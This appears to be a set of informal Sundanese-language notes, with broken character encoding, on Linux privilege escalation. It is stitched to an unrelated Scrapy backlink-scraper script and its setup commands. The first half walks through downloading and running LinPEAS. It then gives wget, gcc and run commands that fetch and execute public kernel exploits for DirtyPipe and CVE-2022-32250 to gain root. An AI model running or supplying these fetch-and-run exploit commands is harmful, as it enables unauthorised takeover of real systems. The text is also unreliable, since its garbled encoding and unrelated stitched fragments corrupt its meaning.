Mun hayang latihan privilege escalation, coba nyaring target ku:

Kernel Exploit â†’ Pariksa versi kernel, tuluy tÃ©ang CVE anu cocok.
Sudo Misconfig â†’ Upami aya parÃ©ntah anu bisa dijalankeun tanpa sandi, Ã©ta bisa dijadikeun jalan.
SUID Binary â†’ Mun aya file SUID anu bisa disalahgunakeun, bisa di-exploit.

Coba make LinPEAS atawa Linux Smart Enumeration (LSE) pikeun scanning:


wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Ieu bakal maluruh potÃ©nsi jalan pikeun root access. ğŸš€

Tapi inget, latihan kudu di lingkungan anu aman jeung legal, Mang. ğŸ˜†

Mang, Ã©ta parÃ©ntah tÃ©h dipakÃ© pikeun ngecek kerentanan (vulnerabilities) dina sistem Linux supaya urang bisa neangan jalan pikeun privilege escalation (ti user biasa jadi root). Ieu rincianna:

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
â†’ Ngundeur (download) script LinPEAS ti GitHub. LinPEAS tÃ©h alat pikeun nganalisa sistem jeung milarian potÃ©nsi jalan pikeun ngarebut hak aksÃ©s root.

chmod +x linpeas.sh
â†’ Ngabogaan hak aksÃ©s execute (ngajalankeun) kana file linpeas.sh, supaya bisa dieksekusi kaya aplikasi biasa.

./linpeas.sh
â†’ Ngajalankeun LinPEAS pikeun nyeken (scan) sistem. Ieu bakal:

Ngecek kerentanan kernel
Ngecek sudo permissions
Ngecek file SUID anu bisa di-exploit
Ngecek misconfigurations dina server
Sanggeus dijalankeun, LinPEAS bakal masihan laporan ngeunaan naon waÃ© potÃ©nsi eksploitasi anu bisa dipakÃ© pikeun ningkatkeun hak aksÃ©s. ğŸš€



ğŸ”¥ (2) CVE-2022-0847 - DirtyPipe (Probable)

wget https://haxx.in/files/dirtypipez.c

gcc dirtypipez.c -o dirtypipe

./dirtypipe

ğŸ”¥ (1) CVE-2022-32250 - Kernel Exploit (Highly Probable)

Bisa jalan di Ubuntu 22.04 (kernel 5.15.0-27-generic)

wget https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c

gcc exp.c -o exploit


./exploit


/var/log/auth.log


backlink_scraper.py


import scrapy

class BacklinkSpider(scrapy.Spider):
    name = "backlink_spider"
    start_urls = ["https://situs-sumber.com"]  # Situs anu bakal di-crawl

    def parse(self, response):
        for link in response.css("a::attr(href)").getall():
            if "http" in link and "website-anjeun.com" in link:
                yield {"backlink": link}



Hayang nyimpen hasilna kana file? Pake parÃ©ntah ieu
scrapy runspider backlink_scraper.py -o backlinks.json


pip install scrapy
scrapy startproject backlink_checker
cd backlink_checker
Simpen kode anu tadi di jero folder spiders/ dina file contona backlink_spider.py.
cd backlink_checker/spiders
nano backlink_spider.py
cd ..
scrapy crawl backlink_spider
scrapy crawl backlink_spider -o hasil.json

